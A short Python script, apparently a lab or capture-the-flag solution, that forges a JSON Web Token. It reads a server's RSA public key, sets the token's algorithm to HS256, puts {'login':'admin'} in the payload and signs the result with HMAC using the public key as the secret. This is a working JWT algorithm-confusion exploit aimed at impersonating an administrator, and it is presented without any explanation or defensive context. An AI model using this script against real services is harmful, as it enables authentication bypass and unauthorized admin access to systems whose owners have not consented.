import hmac
import hashlib
import base64

'''
key="MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAo2R2WvnypG871pBqaAUY\
ShKibV21THtfdQq6uEcVMGHm7kcvsAriHTvC3IlhmfIIMxd3zBGAyNgPpUQiqJQG\
Ac7W3yUxMRO8gzWZzZMjzQT0mDAwQrNWPlKUvDS7mJOymk1kxnilqhuXi8NsbfbC\
9STzZUAoqSyrsLGyggLB5yEPBuNZ3wK/3yNaDmTny3i5s96qfujmQ15MJ/QAgHCr\
+Zeq54fG32yz0o4br88SUEdsExblVYosf3GYRt0cMF/zzeyAJ7QmRqxvN2fNwa/N\
IMPLYzZJs7L1aY75ryzV4P39SRTyQn/op6iWUCuVhZRchKXTGQUfZ7b1HA95it1b\
UQIDAQAB"
'''

def base64urlencode(arg):
    s = base64.standard_b64encode(arg);
    s = s.split('=')[0]
    s = s.replace('+', '-')
    s = s.replace('/', '_')
    return s

f = open('public_key.pem', 'r')

key = f.read()

f.close()

unsigned_toke = base64urlencode('{"typ":"JWT","alg":"HS256"}')+"."+base64urlencode('{"login":"admin"}')

message = bytes(unsigned_toke).encode('utf-8')
secret = bytes(key).encode('utf-8')

signature = hmac.new(secret, message, hashlib.sha256)

signature_b64 = base64urlencode(signature.digest())

print(unsigned_toke+"."+signature_b64)
